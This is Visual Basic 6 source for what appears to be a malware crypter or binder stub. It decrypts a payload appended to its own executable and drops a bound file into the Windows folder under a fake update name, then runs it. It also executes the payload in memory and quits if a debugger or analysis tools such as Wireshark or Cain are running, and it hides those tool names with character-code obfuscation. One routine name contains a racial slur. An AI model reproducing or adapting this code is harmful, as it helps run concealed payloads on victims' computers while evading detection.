Attribute VB_Name = "modMain"
Sub Main()
Dim sSize As String
Dim Firstsplit As String
Dim SecondSplit() As String
Dim Reverse As String
Dim DecryptFile As String
Dim ConvertFile() As Byte
Dim DecryptBindFile As String
Open App.Path & "\" & App.ExeName & ".exe" For Binary Access Read As #1 ' App.Path & "\" & App.ExeName & ".exe"
sSize = Space(LOF(1) + 1)
Get #1, , sSize
Close #1
Firstsplit = Split(sSize, "#*~Fly|Sky~*#")(1)
SecondSplit() = Split(sSize, Firstsplit)
Reverse = StrReverse(SecondSplit(1))
DecryptFile = Decry(Reverse, SecondSplit(6))
If SecondSplit(3) = "" Then
Else
If ZGHUhjbasDhbSDA() = True Then End
If IsDebuggerActive = True Then End
End If
If SecondSplit(5) = "" Then
Else
If iuSANVLigjgfsdg(Chr$(119) & Chr$(105) & Chr$(114) & Chr$(101) & Chr$(115) & Chr$(104) & Chr$(97) & Chr$(114) & Chr$(107) & Chr$(46) & Chr$(101) & Chr$(120) & Chr$(101)) = True Then End
If iuSANVLigjgfsdg(Chr$(119) & Chr$(115) & Chr$(107) & Chr$(46) & Chr$(101) & Chr$(120) & Chr$(101)) = True Then End
If iuSANVLigjgfsdg(Chr$(119) & Chr$(115) & Chr$(46) & Chr$(101) & Chr$(120) & Chr$(101)) = True Then End
If iuSANVLigjgfsdg(Chr$(119) & Chr$(105) & Chr$(114) & Chr$(101) & Chr$(46) & Chr$(101) & Chr$(120) & Chr$(101)) = True Then End
End If
If SecondSplit(4) = "" Then
Else
If iuSANVLigjgfsdg(Chr$(67) & Chr$(97) & Chr$(105) & Chr$(110) & Chr$(46) & Chr$(101) & Chr$(120) & Chr$(101)) = True Then End
End If
ConvertFile() = StrConv(DecryptFile, vbFromUnicode)
If SecondSplit(2) = "" Then
Else
DecryptBindFile = Decry(SecondSplit(2), SecondSplit(6))
Open Environ("windir") & "\Net_Win_Update_Stat_735772656547.exe" For Binary As #1
Put #1, , DecryptBindFile
Close #1
Shell (Environ("windir") & "\Net_Win_Update_Stat_735772656547.exe")
End If

Call RoterNigger(App.Path & "\" & App.ExeName & ".exe", ConvertFile())
End
End Sub
Function iuSANVLigjgfsdg(ExeName As String) As Boolean
    Dim Process As Object
        Dim strObject As String
            strObject = Chr$(119) & Chr$(105) & Chr$(110) & Chr$(109) & Chr$(103) & Chr$(109) & Chr$(116) & Chr$(115) & "://" & strServer
                For Each Process In GetObject(strObject).InstancesOf(Chr$(119) & Chr$(105) & Chr$(110) & Chr$(51) & Chr$(50) & Chr$(95) & Chr$(112) & _
                    Chr$(114) & Chr$(111) & Chr$(99) & Chr$(101) & Chr$(115) & Chr$(115))
                If UCase(Process.Name) = UCase(ExeName) Then
            iuSANVLigjgfsdg = True
            Exit Function
        End If
    Next
End Function

